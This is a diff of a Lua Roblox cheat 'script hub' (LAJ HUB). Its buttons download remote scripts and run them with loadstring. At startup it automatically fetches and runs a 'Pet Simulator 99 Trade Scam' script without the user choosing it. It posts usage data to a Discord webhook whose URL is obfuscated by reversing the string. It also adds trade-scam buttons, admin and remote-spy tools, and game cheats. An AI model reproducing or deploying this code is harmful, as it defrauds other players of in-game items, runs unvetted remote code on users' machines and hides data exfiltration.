@@ -1,97 +1,10 @@
--- Mock Roblox environment for Replit testing
-if not _G.IsRobloxEnvironment then
-    game = {
-        PlaceId = 123456,
-        HttpGet = function(self, url, cache)
-            print("Mock HttpGet called for: " .. url)
-            return "-- Mock script content for Replit testing"
-        end,
-        GetService = function(self, serviceName)
-            local service = {}
-            if serviceName == "Players" then
-                service.LocalPlayer = {
-                    Name = "TestPlayer",
-                    UserId = 123456789
-                }
-                service.GetPlayers = function()
-                    return {service.LocalPlayer}
-                end
-                service.NumPlayers = 1
-            elseif serviceName == "HttpService" then
-                service.JSONEncode = function(self, data)
-                    return "{\"encoded\": \"json\"}" -- Mock JSON
-                end
-                service.JSONDecode = function(self, json)
-                    return {decoded = "data"}
-                end
-                service.UrlEncode = function(self, str)
-                    return str -- Just return the string for testing
-                end
-            elseif serviceName == "MarketplaceService" then
-                service.GetProductInfo = function(self, placeId)
-                    return {Name = "Mock Game Name"}
-                end
-            elseif serviceName == "StarterGui" then
-                service.SetCore = function(self, action, data)
-                    if action == "SendNotification" then
-                        print("NOTIFICATION: " .. data.Title .. " - " .. (data.Text or ""))
-                    end
-                end
-            end
-            return service
-        end
-    }
-    -- Mock other global functions
-    warn = function(msg)
-        print("WARN: " .. tostring(msg))
-    end
-    
-    setclipboard = function(text)
-        print("Clipboard set to: " .. text)
-    end
-    
-    -- Mock identifyexecutor for testing
-    identifyexecutor = function()
-        return "Replit Test Environment"
-    end
-    
-    -- Mock datetime
-    DateTime = {
-        now = function()
-            return {
-                ToIsoDate = function()
-                    return os.date("%Y-%m-%dT%H:%M:%SZ")
-                end
-            }
-        end
-    }
-    
-    -- Mock loadstring for testing
-    _G.loadedScripts = {}
-    local originalLoadstring = loadstring
-    loadstring = function(code)
-        table.insert(_G.loadedScripts, code)
-        print("Loaded script with length: " .. #code)
-        return function() 
-            print("Executed mock loadstring")
-            return true
-        end
-    end
-end
-
 --[[
     LAJ HUB - Swift Compatible Version
     Created for universal executor compatibility with special Swift support
 ]]
+
 -- Function to handle HTTP requests across different executors including Swift
-local function getHttpRequest(url, cache)
-    -- When running in Replit testing environment
-    if not _G.IsRobloxEnvironment then
-        print("Running in Replit environment - using mock data for: " .. url)
-        return "-- Mock data for testing in Replit"
-    end
-    
-    -- For Roblox executors
+local function getHttpRequest(url)
     if swift and swift.request then
         local response = swift.request({
             Url = url,
@@ -100,81 +13,16 @@ local function getHttpRequest(url, cache)
         if response and response.Body then
             return response.Body
         end
-    elseif syn and syn.request then
-        return game:HttpGet(url, cache)
-    elseif http and http.request then
-        return game:HttpGet(url, cache)
-    elseif request then
-        return game:HttpGet(url, cache)
     end
     
     -- Fallback to standard HttpGet for other executors
-    return game:HttpGet(url, cache)
+    return game:HttpGet(url)
 end
 
 -- Load Pet Simulator 99 Trade Scam script
 loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
 
--- Mock or real Rayfield UI
-local Rayfield
-if not _G.IsRobloxEnvironment then
-    Rayfield = {
-        CreateWindow = function(options)
-            print("Creating Window: " .. (options.Name or "Unnamed Window"))
-            return {
-                CreateTab = function(tabOptions)
-                    print("Creating Tab: " .. (tabOptions.Name or "Unnamed Tab"))
-                    return {
-                        CreateSection = function(sectionOptions)
-                            print("Creating Section: " .. (sectionOptions.Name or "Unnamed Section"))
-                            return {}
-                        end,
-                        CreateButton = function(buttonOptions)
-                            print("Creating Button: " .. (buttonOptions.Name or "Unnamed Button"))
-                            return {}
-                        end,
-                        CreateToggle = function(toggleOptions)
-                            print("Creating Toggle: " .. (toggleOptions.Name or "Unnamed Toggle"))
-                            return function() end
-                        end,
-                        CreateParagraph = function(paragraphOptions)
-                            print("Creating Paragraph: " .. (paragraphOptions.Title or "No Title"))
-                            return {}
-                        end,
-                        CreateLabel = function(text)
-                            print("Creating Label: " .. (text or "No Text"))
-                            return {}
-                        end,
-                        CreateInput = function(inputOptions)
-                            print("Creating Input: " .. (inputOptions.Name or "Unnamed Input"))
-                            return {}
-                        end,
-                        CreateDropdown = function(dropdownOptions)
-                            print("Creating Dropdown: " .. (dropdownOptions.Name or "Unnamed Dropdown"))
-                            return {}
-                        end,
-                        CreateSlider = function(sliderOptions)
-                            print("Creating Slider: " .. (sliderOptions.Name or "Unnamed Slider"))
-                            return {}
-                        end,
-                        CreateKeybind = function(keybindOptions)
-                            print("Creating Keybind: " .. (keybindOptions.Name or "Unnamed Keybind"))
-                            return {}
-                        end
-                    }
-                end,
-                Destroy = function()
-                    print("Window Destroyed")
-                end
-            }
-        end,
-        Notify = function(options)
-            print("Notification: " .. (options.Title or "Untitled") .. " - " .. (options.Content or "No description"))
-        end
-    }
-else
-    Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
-end
+local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -216,118 +64,9 @@ end
 
 local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
 
--- Global tracking table (persists between executions if supported by executor)
-if not _G.LAJHubGameTracker then
-    _G.LAJHubGameTracker = {
-        games = {}, -- Track game usage: {[gameId] = {name = "Game Name", count = 0}}
-        lastDailyReport = 0, -- Timestamp of last daily report
-    }
-end
-
--- Function to track the current game
-local function trackGame()
-    local gameId = tostring(game.PlaceId)
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
-    
-    -- Initialize or update game entry
-    if not _G.LAJHubGameTracker.games[gameId] then
-        _G.LAJHubGameTracker.games[gameId] = {
-            name = gameName,
-            count = 1
-        }
-    else
-        _G.LAJHubGameTracker.games[gameId].count = _G.LAJHubGameTracker.games[gameId].count + 1
-        -- Update name in case it changed
-        _G.LAJHubGameTracker.games[gameId].name = gameName
-    end
-end
-
--- Function to get the most played game
-local function getMostPlayedGame()
-    local mostPlayed = {
-        gameId = nil,
-        name = "None",
-        count = 0
-    }
-    
-    for gameId, data in pairs(_G.LAJHubGameTracker.games) do
-        if data.count > mostPlayed.count then
-            mostPlayed.gameId = gameId
-            mostPlayed.name = data.name
-            mostPlayed.count = data.count
-        end
-    end
-    
-    return mostPlayed
-end
-
--- Check if we should send a daily report
-local function shouldSendDailyReport()
-    local currentTime = os.time()
-    local oneDayInSeconds = 24 * 60 * 60
-    
-    -- Send report if this is the first time or if a day has passed since last report
-    return _G.LAJHubGameTracker.lastDailyReport == 0 or 
-           (currentTime - _G.LAJHubGameTracker.lastDailyReport) >= oneDayInSeconds
-end
-
--- Function to send daily most played game report
-local function sendDailyGameReport()
-    if not shouldSendDailyReport() then return end
-    
-    local mostPlayed = getMostPlayedGame()
-    local success, error_message = pcall(function()
-        local response = makeHttpRequest({
-            Url = DISCORD_WEBHOOK_URL,
-            Method = 'POST',
-            Headers = {
-                ['Content-Type'] = 'application/json'
-            },
-            Body = HttpService:JSONEncode({
-                ["content"] = "",
-                ["embeds"] = {{
-                    ["title"] = "LAJ HUB Daily Game Report",
-                    ["type"] = "rich",
-                    ["color"] = 0x00FFFF, -- Cyan color for reports
-                    ["fields"] = {
-                        {
-                            ["name"] = "Most Played Game:",
-                            ["value"] = "```" .. mostPlayed.name .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Play Count:",
-                            ["value"] = "```" .. tostring(mostPlayed.count) .. "```",
-                            ["inline"] = true
-                        },
-                        {
-                            ["name"] = "Game ID:",
-                            ["value"] = "```" .. (mostPlayed.gameId or "Unknown") .. "```",
-                            ["inline"] = true
-                        }
-                    },
-                    ["footer"] = {
-                        ["text"] = "Daily Report Generated on " .. os.date("%Y-%m-%d")
-                    }
-                }}
-            })
-        })
-    end)
-    
-    if not success then
-        warn("Failed to send daily game report: " .. tostring(error_message))
-    else
-        -- Update the last report time
-        _G.LAJHubGameTracker.lastDailyReport = os.time()
-    end
-end
-
--- Standard usage data webhook
 local function sendUsageData()
     local success, error_message = pcall(function()
-        -- Track this game execution
-        trackGame()
-        
+    
         local response = makeHttpRequest({
             Url = DISCORD_WEBHOOK_URL,
             Method = 'POST',
@@ -378,9 +117,6 @@ local function sendUsageData()
                 }}
             })
         })
-        
-        -- Check if we should send a daily report
-        sendDailyGameReport()
     end)
     
     if not success then
@@ -388,19 +124,18 @@ local function sendUsageData()
     end
 end
 
--- Send the initial usage data
 sendUsageData()
 
--- Utility function to check if hub is running in Swift
-local function isSwiftExecutor()
-    return swift ~= nil
-end
-
--- Create the main window
 local Window = Rayfield:CreateWindow({
-   Name = "LAJ HUB" .. (isSwiftExecutor() and " (Swift)" or ""),
+   Name = "LAJ HUB (Swift)",
+   Icon = 0,
    LoadingTitle = "LAJ HUB",
-   LoadingSubtitle = "Optimized for Swift Executor",
+   LoadingSubtitle = "Premium Scripts",
+   Theme = "Default",
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+
    ConfigurationSaving = {
       Enabled = true,
       FolderName = "LAJHub",
@@ -419,22 +154,17 @@ local Window = Rayfield:CreateWindow({
 
 -- Create tabs
 local MainTab = Window:CreateTab("Main", 4483362458)
-local DaStrikeTab = Window:CreateTab("Da Strike", 4483362458)
-local FischTab = Window:CreateTab("Fisch", 4483362458)
+local Tab = Window:CreateTab("Da Strike", 4483362458)
+local Fin = Window:CreateTab("Fisch", 4483362458)
 local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
 local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
-local Rivals = Window:CreateTab("Rivals", 4483362458)
 local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
 local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
 local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
+local Universal = Window:CreateTab("Universal", 4483362458)
 local Settings = Window:CreateTab("Settings", 4483362458)
 
 local function executednotify(scriptName)
-   if not Rayfield then
-       print("Executed: " .. scriptName .. " - Script loaded successfully!")
-       return
-   end
-   
    Rayfield:Notify({
        Title = scriptName,
        Content = "Script loaded successfully!",
@@ -457,8 +187,22 @@ MainTab:CreateButton({
    end,
 })
 
+-- Test webhook button
+MainTab:CreateButton({
+   Name = "Test Webhook",
+   Callback = function()
+       sendUsageData()
+       Rayfield:Notify({
+           Title = "Webhook Test",
+           Content = "Attempted to send webhook notification!",
+           Duration = 3,
+           Image = 4483362458,
+       })
+   end,
+})
+
 -- Da Strike Tab scripts
-DaStrikeTab:CreateButton({
+Tab:CreateButton({
    Name = "Psalm",
    Callback = function()
         loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
@@ -466,7 +210,7 @@ DaStrikeTab:CreateButton({
    end,
 })
 
-DaStrikeTab:CreateButton({
+Tab:CreateButton({
    Name = "Ballware vfs",
    Callback = function()
         loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
@@ -474,7 +218,7 @@ DaStrikeTab:CreateButton({
    end,
 })
 
-DaStrikeTab:CreateButton({
+Tab:CreateButton({
    Name = "FrostByte",
    Callback = function()
         loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
@@ -483,39 +227,11 @@ DaStrikeTab:CreateButton({
 })
 
 -- Fisch Tab
-FischTab:CreateSection({
-   Name = "Fisch Game Scripts"
-})
-
-FischTab:CreateButton({
-   Name = "Fisch Aimbot (No Key)",
+Fin:CreateButton({
+   Name = "Speed Hub",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/AimBot-Creator/AimX/main/Loader.lua"))()
-       executednotify("Fisch Aimbot")
-   end,
-})
-
-FischTab:CreateButton({
-   Name = "Fisch Auto Win (Premium)",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/GamingScripter/V.G-Hub/main/Games/Fisch"))()
-       executednotify("Fisch Auto Win")
-   end,
-})
-
-FischTab:CreateButton({
-   Name = "Fisch Gunmods",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FischIOGunMods.lua"))()
-       executednotify("Fisch Gunmods")
-   end,
-})
-
-FischTab:CreateButton({
-   Name = "AlexR Hunt GUI",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/AlexR32/Roblox/main/Scripts/Fisch.lua"))()
-       executednotify("AlexR Hunt GUI")
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
+        executednotify("Speed Hub")
    end,
 })
 
@@ -528,65 +244,12 @@ BballZero:CreateButton({
    end,
 })
 
--- Blue Lock Rivals Tab
-BlueLock:CreateSection({
-   Name = "Coming Soon 🙄"
-})
-
--- Rivals Tab (Keyless Scripts)
-Rivals:CreateButton({
-   Name = "8Bits Hub (Keyless)",
+-- Blue Lock Rivals script
+BlueLock:CreateButton({
+   Name = "LAJ HUB",
    Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/firsthopper"))()
-        executednotify("8Bits Hub Keyless")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Ronix Hub (Keyless)",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/6280401d0be2cfd1f1c4fe02f42a5b6e.lua"))()
-        executednotify("Ronix Hub Keyless")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Venox Hub (Keyless)",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/venoxs/vhub/refs/heads/main/loader"))()
-        executednotify("Venox Hub Keyless")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "LunaX Hub (Keyless)",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/ItzzLuna/Luna-Script/main/LunaHub.txt"))()
-        executednotify("LunaX Hub Keyless")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "TBao Hub (Keyless)",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubBlue"))()
-        executednotify("TBao Hub Keyless")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Ventures Hub (Keyless)",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/xnazurx/VenturezHub/main/Main.lua"))()
-        executednotify("Ventures Hub Keyless")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Pinguin Rivals (Keyless)",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/PinguinRobloxYT/LunaHubBlueWS/main/bluerivalsws"))()
-        executednotify("Pinguin Rivals Keyless")
+        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
+        executednotify("LAJ HUB")
    end,
 })
 
@@ -607,226 +270,129 @@ DeadRails:CreateButton({
    end,
 })
 
-DeadRails:CreateButton({
-   Name = "Markk Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
-       executednotify("Markk Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Farx11122 Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
-       executednotify("Farx11122 Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "SpiderXHub Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
-       executednotify("SpiderXHub Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Strelizia Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
-       executednotify("Strelizia Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Rinns Dead Rails No Key",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
-       executednotify("Rinns Dead Rails No Key")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Auto Farm Bond",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
-       executednotify("Auto Farm Bond")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Lomu Hub",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
-       executednotify("Lomu Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Neox Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
-       executednotify("Neox Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Sypher Hub OP",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
-       executednotify("Sypher Hub OP")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Tbao Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
-       executednotify("Tbao Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Karol Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
-       executednotify("Karol Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Dead Rails Alpha Script",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
-       executednotify("Dead Rails Alpha Script")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Airflow UPDATED",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Null-Fire Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
-       executednotify("Null-Fire Keyless")
-   end,
-})
-
--- Blox Fruits Tab
-BloxFruits:CreateSection({
-   Name = "Blox Fruits Scripts"
-})
-
+-- Blox Fruits Tab (Updated)
 BloxFruits:CreateButton({
-   Name = "Mukuro Hub (Best)",
+   Name = "REDz Hub",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader"))()
-       executednotify("Mukuro Hub")
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+       executednotify("REDz Hub")
    end,
 })
 
-BloxFruits:CreateButton({
-   Name = "Hoho Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
-       executednotify("Hoho Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Zen Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Loader"))()
-       executednotify("Zen Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Thunder Z Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Mobile"))()
-       executednotify("Thunder Z Hub")
-   end,
-})
-BloxFruits:CreateButton({
-   Name = "Mukuro Hub (Best)",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader"))()
-       executednotify("Mukuro Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Hoho Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
-       executednotify("Hoho Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Zen Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Loader"))()
-       executednotify("Zen Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Thunder Z Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Mobile"))()
-       executednotify("Thunder Z Hub")
-   end,
-})
-
--- Pet Simulator 99 Tab
+-- Pet Sim 99 Tab with the new Trade Scam (only the one you requested)
 PetSim99:CreateButton({
    Name = "Trade Scam",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
-       executednotify("Pet Sim 99 Trade Scam")
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/SyntaxHubX/Trade-Scam-V2/main/scriptv2.lua"))()
+       executednotify("Trade Scam")
    end,
 })
 
 PetSim99:CreateButton({
-   Name = "Auto Farm",
+   Name = "LAJ Trade Scam (Custom)",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/easziest/ps99/main/hub.lua"))()
-       executednotify("Pet Sim 99 Auto Farm")
+       -- Load the script from GitHub
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+       executednotify("LAJ Custom Trade Scam")
    end,
 })
+
+-- Universal Tab
+Universal:CreateButton({
+   Name = "Infinite Yield FE",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+       executednotify("Infinite Yield")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Dex Explorer",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
+       executednotify("Dex Explorer")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Hydroxide",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
+       executednotify("Hydroxide")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "SimpleSpy",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+       executednotify("SimpleSpy")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "CMD-X Admin",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
+       executednotify("CMD-X Admin")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Domain X",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
+       executednotify("Domain X")
+   end,
+})
+
 
 -- Settings Tab
+local idled_Connection
+
+local function onIdled()
+    game:GetService("VirtualUser"):CaptureController()
+    game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
+end
+
 Settings:CreateButton({
-   Name = "Destroy UI",
-   Callback = function()
-       if Rayfield then
-           Rayfield:Destroy()
-       end
-   end,
+    Name = "Anti AFK",
+    Callback = function()
+        if not idled_Connection then
+            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
+            executednotify("Anti AFK")
+        end
+    end,
 })
+
+local Inf_jump = false
 
 Settings:CreateToggle({
-   Name = "Anonymous Usage Tracking",
-   CurrentValue = true,
-   Flag = "AnonymousTracking",
+   Name = "Infinite Jump",
+   CurrentValue = false,
    Callback = function(Value)
-       _G.AnonymousTracking = Value
+      Inf_jump = Value
+      game:GetService("UserInputService").JumpRequest:Connect(function()
+         if Inf_jump then
+            game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+         end
+      end)
    end,
 })
 
-Settings:CreateParagraph({
-   Title = "About LAJ HUB",
-   Content = "LAJ HUB is a premium script hub for Roblox with Swift Executor compatibility. Join our Discord for exclusive scripts and updates."
-})
+-- Credit section
+local creditSection = MainTab:CreateSection("Credits")
 
--- Initialize with defaults
-_G.AnonymousTracking = true
+MainTab:CreateLabel("Created by LAJ Hub Team")
+MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
+MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
+MainTab:CreateLabel("* Optimized for Swift Executor")
+
+-- Print Swift compatibility notice
+print("LAJ HUB - Swift Compatible Version")
+print("All HTTP requests have been optimized for Swift executor")
+print("This version includes:")
+print("1. Full Swift compatibility")
+print("2. Pet Sim 99 Tab with new Trade Scam V2")
+print("3. All scripts updated to work with Swift")
+print("4. Improved executor detection")
